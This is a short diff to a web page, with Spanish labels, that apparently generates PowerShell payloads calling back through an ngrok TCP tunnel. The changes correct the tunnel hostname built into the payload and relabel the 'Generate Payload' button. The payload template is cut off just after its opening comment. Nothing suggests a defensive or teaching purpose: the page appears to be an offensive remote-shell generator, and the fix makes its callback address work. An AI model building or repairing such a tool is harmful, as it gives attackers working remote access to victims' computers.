@@ -283,7 +283,7 @@
                 <div class="ip-input">
                     <span>Subdominio:</span>
                     <input type="text" class="ip-part" id="ngrok-subdomain" placeholder="tunel">
-                    <span>.ngrok.tcp.io</span>
+                    <span>.tcp.eu.ngrok.io</span>
                 </div>
                 <div class="ip-input">
                     <span>Puerto:</span>
@@ -291,7 +291,7 @@
                 </div>
             </div>
 
-            <button class="generate-btn" onclick="generatePayload()">⚡ Generar Payload</button>
+            <button class="generate-btn" onclick="generatePayload()">⚡ GENERATE PAYLOAD</button>
             
             <textarea id="payload" spellcheck="false"></textarea>
             
@@ -327,7 +327,7 @@
             } else {
                 const subdomain = document.getElementById('ngrok-subdomain').value;
                 port = document.getElementById('ngrok-port').value;
-                ip = `${subdomain}.tcp.eu.ngrok.tcp.io`;
+                ip = `${subdomain}.tcp.eu.ngrok.io`;
             }
 
             const payloadTemplate = `# Ejecutar esto en PowerShell visible para ver errores
